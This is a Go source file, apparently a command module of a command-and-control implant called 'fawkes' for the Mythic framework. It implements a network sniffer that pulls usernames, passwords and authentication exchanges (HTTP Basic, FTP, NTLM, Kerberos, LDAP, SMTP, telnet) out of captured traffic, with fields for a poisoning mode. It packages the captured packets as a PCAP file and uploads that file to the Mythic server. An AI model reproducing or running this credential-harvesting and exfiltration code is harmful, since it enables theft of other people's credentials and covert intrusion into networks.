package commands

import (
	"encoding/binary"
	"encoding/json"
	"fmt"
	"net"
	"strings"
	"sync"
	"time"

	"fawkes/pkg/structs"
)

type sniffParams struct {
	Action      string `json:"action"`
	Interface   string `json:"interface"`
	Duration    int    `json:"duration"`
	MaxBytes    int64  `json:"max_bytes"`
	Ports       string `json:"ports"`
	Promiscuous bool   `json:"promiscuous"`
	SavePCAP    bool   `json:"save_pcap"`
	// Poison-mode fields
	ResponseIP string `json:"response_ip"`
	Protocols  string `json:"protocols"`
}

type sniffCredential struct {
	Protocol  string `json:"protocol"`
	SrcIP     string `json:"src_ip"`
	SrcPort   uint16 `json:"src_port"`
	DstIP     string `json:"dst_ip"`
	DstPort   uint16 `json:"dst_port"`
	Username  string `json:"username"`
	Password  string `json:"password,omitempty"`
	Detail    string `json:"detail,omitempty"`
	Timestamp int64  `json:"timestamp"`
}

type sniffResult struct {
	Duration      string             `json:"duration"`
	PacketCount   int                `json:"packet_count"`
	BytesCaptured int64              `json:"bytes_captured"`
	Credentials   []*sniffCredential `json:"credentials"`
	Errors        []string           `json:"errors,omitempty"`
	PCAPFileID    string             `json:"pcap_file_id,omitempty"`
}

// sniffPCAPCollector collects raw packets for PCAP file generation.
type sniffPCAPCollector struct {
	mu      sync.Mutex
	packets []sniffPCAPPacket
	maxSize int64
	size    int64
}

type sniffPCAPPacket struct {
	timestamp time.Time
	data      []byte
}

func newSniffPCAPCollector(maxSize int64) *sniffPCAPCollector {
	return &sniffPCAPCollector{maxSize: maxSize}
}

func (c *sniffPCAPCollector) addPacket(data []byte) {
	c.mu.Lock()
	defer c.mu.Unlock()
	if c.size+int64(len(data)) > c.maxSize {
		return // Drop packet if over size limit
	}
	pkt := sniffPCAPPacket{
		timestamp: time.Now(),
		data:      make([]byte, len(data)),
	}
	copy(pkt.data, data)
	c.packets = append(c.packets, pkt)
	c.size += int64(len(data))
}

// buildPCAP generates a libpcap-format file from collected packets.
// Uses the standard pcap file format (magic 0xA1B2C3D4).
func (c *sniffPCAPCollector) buildPCAP(linkType uint32) []byte {
	c.mu.Lock()
	defer c.mu.Unlock()

	// Estimate total size: 24 (global header) + N * (16 + packet_len)
	totalSize := 24
	for _, p := range c.packets {
		totalSize += 16 + len(p.data)
	}

	buf := make([]byte, 0, totalSize)

	// PCAP Global Header (24 bytes)
	hdr := make([]byte, 24)
	binary.LittleEndian.PutUint32(hdr[0:4], 0xA1B2C3D4) // magic
	binary.LittleEndian.PutUint16(hdr[4:6], 2)          // version major
	binary.LittleEndian.PutUint16(hdr[6:8], 4)          // version minor
	binary.LittleEndian.PutUint32(hdr[8:12], 0)         // thiszone
	binary.LittleEndian.PutUint32(hdr[12:16], 0)        // sigfigs
	binary.LittleEndian.PutUint32(hdr[16:20], 65535)    // snaplen
	binary.LittleEndian.PutUint32(hdr[20:24], linkType) // link type
	buf = append(buf, hdr...)

	// Per-packet records
	for _, p := range c.packets {
		rec := make([]byte, 16)
		binary.LittleEndian.PutUint32(rec[0:4], uint32(p.timestamp.Unix()))
		binary.LittleEndian.PutUint32(rec[4:8], uint32(p.timestamp.Nanosecond()/1000)) // microseconds
		binary.LittleEndian.PutUint32(rec[8:12], uint32(len(p.data)))                  // incl_len
		binary.LittleEndian.PutUint32(rec[12:16], uint32(len(p.data)))                 // orig_len
		buf = append(buf, rec...)
		buf = append(buf, p.data...)
	}

	return buf
}

type packetMeta struct {
	SrcIP   string
	DstIP   string
	SrcPort uint16
	DstPort uint16
}

func sniffApplyDefaults(params *sniffParams) []uint16 {
	if params.Duration <= 0 {
		params.Duration = 30
	}
	if params.Duration > 300 {
		params.Duration = 300
	}
	if params.MaxBytes <= 0 {
		params.MaxBytes = 50 * 1024 * 1024
	}
	var ports []uint16
	if params.Ports != "" {
		for _, p := range strings.Split(params.Ports, ",") {
			p = strings.TrimSpace(p)
			var port int
			if _, err := fmt.Sscanf(p, "%d", &port); err == nil && port > 0 && port < 65536 {
				ports = append(ports, uint16(port))
			}
		}
	}
	if len(ports) == 0 {
		ports = []uint16{21, 53, 80, 88, 110, 143, 389, 445, 8080}
	}
	return ports
}

type sniffPacketResult struct {
	Meta    packetMeta
	Payload []byte
}

func sniffParseIPPacket(ipData []byte) *sniffPacketResult {
	if len(ipData) < 20 {
		return nil
	}
	ihl := int(ipData[0]&0x0F) * 4
	proto := ipData[9]
	if ihl < 20 || ihl > len(ipData) || (proto != 6 && proto != 17) {
		return nil
	}
	totalLen := int(binary.BigEndian.Uint16(ipData[2:4]))
	if totalLen > len(ipData) {
		totalLen = len(ipData)
	}
	if ihl > totalLen {
		return nil
	}
	meta := packetMeta{
		SrcIP: net.IP(ipData[12:16]).String(),
		DstIP: net.IP(ipData[16:20]).String(),
	}
	transportData := ipData[ihl:totalLen]
	var payload []byte
	if proto == 6 {
		if len(transportData) < 20 {
			return nil
		}
		meta.SrcPort = binary.BigEndian.Uint16(transportData[0:2])
		meta.DstPort = binary.BigEndian.Uint16(transportData[2:4])
		dataOff := int(transportData[12]>>4) * 4
		if dataOff < 20 || dataOff > len(transportData) {
			return nil
		}
		payload = transportData[dataOff:]
	} else {
		if len(transportData) < 8 {
			return nil
		}
		meta.SrcPort = binary.BigEndian.Uint16(transportData[0:2])
		meta.DstPort = binary.BigEndian.Uint16(transportData[2:4])
		payload = transportData[8:]
	}
	if len(payload) == 0 {
		return nil
	}
	return &sniffPacketResult{Meta: meta, Payload: payload}
}

func sniffMatchPort(ports []uint16, srcPort, dstPort uint16) bool {
	for _, p := range ports {
		if srcPort == p || dstPort == p {
			return true
		}
	}
	return false
}

func sniffExtractCredentials(payload []byte, meta *packetMeta, result *sniffResult, ftpTracker *sniffFTPTracker, telnetTracker *sniffTelnetTracker) {
	if cred := sniffExtractHTTPBasicAuth(payload, meta); cred != nil {
		result.Credentials = append(result.Credentials, cred)
	}
	if meta.DstPort == 21 || meta.SrcPort == 21 {
		if cred := ftpTracker.process(payload, meta); cred != nil {
			result.Credentials = append(result.Credentials, cred)
		}
	}
	if cred := sniffExtractNTLM(payload, meta); cred != nil {
		result.Credentials = append(result.Credentials, cred)
	}
	if cred := sniffExtractKerberos(payload, meta); cred != nil {
		result.Credentials = append(result.Credentials, cred)
	}
	if cred := sniffExtractDNS(payload, meta); cred != nil {
		result.Credentials = append(result.Credentials, cred)
	}
	if cred := sniffExtractLDAP(payload, meta); cred != nil {
		result.Credentials = append(result.Credentials, cred)
	}
	if cred := sniffExtractSMTPAuth(payload, meta); cred != nil {
		result.Credentials = append(result.Credentials, cred)
	}
	if cred := telnetTracker.process(payload, meta); cred != nil {
		result.Credentials = append(result.Credentials, cred)
	}
}

func sniffFinalizeResult(task *structs.Task, result *sniffResult, startTime time.Time, pcapCollector *sniffPCAPCollector, linkType uint32) structs.CommandResult {
	result.Duration = time.Since(startTime).Truncate(time.Second).String()
	if pcapCollector != nil && len(pcapCollector.packets) > 0 {
		pcapData := pcapCollector.buildPCAP(linkType)
		sniffUploadPCAP(task, pcapData, result)
	}
	output, err := json.Marshal(result)
	if err != nil {
		return errorf("failed to marshal result: %v", err)
	}
	return successResult(string(output))
}

// sniffUploadPCAP uploads a PCAP file to Mythic using the file transfer channel.
func sniffUploadPCAP(task *structs.Task, pcapData []byte, result *sniffResult) {
	uploadMsg := structs.SendFileToMythicStruct{}
	uploadMsg.Task = task
	uploadMsg.IsScreenshot = false
	uploadMsg.SendUserStatusUpdates = false
	uploadMsg.Data = &pcapData
	uploadMsg.FileName = fmt.Sprintf("sniff_%s.pcap", time.Now().Format("20060102_150405"))
	uploadMsg.FullPath = ""
	uploadMsg.FinishedTransfer = make(chan int, 2)

	task.Job.SendFileToMythic <- uploadMsg

	// Wait for transfer (with timeout)
	select {
	case <-uploadMsg.FinishedTransfer:
		result.PCAPFileID = uploadMsg.FileName
	case <-time.After(60 * time.Second):
		result.Errors = append(result.Errors, "PCAP upload timed out")
	}
}
